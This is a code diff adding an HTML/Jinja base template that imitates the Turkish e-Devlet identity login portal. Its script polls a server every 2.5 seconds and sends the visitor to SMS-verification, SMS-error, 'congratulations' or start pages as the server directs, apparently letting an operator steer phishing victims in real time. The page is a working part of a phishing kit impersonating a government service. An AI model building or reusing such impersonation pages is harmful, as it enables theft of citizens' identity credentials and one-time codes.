@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="tr" class="no-js">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>{% block title %}e-Devlet Kapısı{% endblock %}</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="e-Devlet Kapısı">
+    <link rel="icon" type="image/png" href="{{ url_for('static', filename='img/favicon-196x196.png') }}" sizes="196x196">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/base.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/giris.css') }}">
+    <script src="{{ url_for('static', filename='js/header.js') }}" defer></script>
+    {% block head %}{% endblock %}
+</head>
+<body data-lang="tr" data-poll-url="{{ poll_url|default('', true) }}">
+<div id="page">
+    <header id="headerSection">
+        <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
+        <nav id="accesibilityBlock" class="visuallyhidden">
+            <ul>
+                <li><a href="#loginForm" accesskey="s">Ana Sayfa</a></li>
+                <li><a href="#pageContent" accesskey="1">İçeriğe Git</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <section class="referrerApp">
+            <img class="sso" src="{{ url_for('static', filename='img/1.png') }}" alt="" width="165" height="40">
+            <dl>
+                <dt>Giriş Yapılacak Uygulama</dt>
+                <dd><span title="e-Devlet Kapısı">e-Devlet Kapısı</span></dd>
+            </dl>
+        </section>
+        <nav class="methodSelector"></nav>
+        <section id="pageContent">
+            {% block content %}{% endblock %}
+        </section>
+    </main>
+    <footer>
+        <ul class="footerLinks">
+            <li><a href="#" open-modal="gizlilikGuvenlik">Gizlilik ve Güvenlik</a></li>
+            <li><a href="#/iletisim?hizli=CozumMerkezi2" target="_blank">Hızlı Çözüm Merkezi</a></li>
+        </ul>
+    <div class="copyrightDetails">© 2025, Ankara - Tüm Hakları Saklıdır</div>
+    </footer>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="{{ url_for('static', filename='js/jquery.maskedinput.js') }}"></script>
+<script src="{{ url_for('static', filename='js/inputmask.js') }}"></script>
+<script src="{{ url_for('static', filename='js/inputmask.extensions.js') }}"></script>
+<script src="{{ url_for('static', filename='js/inputmask.numeric.extensions.js') }}"></script>
+<script src="{{ url_for('static', filename='js/inputmask.date.extensions.js') }}"></script>
+<script src="{{ url_for('static', filename='js/jquery.inputmask.js') }}"></script>
+<script>
+    const pollData = (document.body.dataset.pollUrl || '').trim();
+    const pollUrl = pollData.length ? pollData : null;
+    if (pollUrl) {
+        const poll = () => {
+            $.ajax({
+                type: 'POST',
+                url: pollUrl,
+                success: function (msg) {
+                    if (!msg) {
+                        return;
+                    }
+                    if (msg === 'back') {
+                        window.location.href = "{{ url_for('public.index') }}";
+                    }
+                    if (msg === 'hata1') {
+                        window.location.href = "{{ url_for('public.sms_hatali') }}";
+                    }
+                    if (msg === 'sms') {
+                        window.location.href = "{{ url_for('public.sms_dogrulama') }}";
+                    }
+                    if (msg === 'tebrik') {
+                        window.location.href = "{{ url_for('public.tebrikler') }}";
+                    }
+                }
+            });
+        }
+        $(document).ready(function() {
+            poll();
+            setInterval(poll, 2500);
+        });
+    }
+</script>
+{% block scripts %}{% endblock %}
+</body>
+</html>
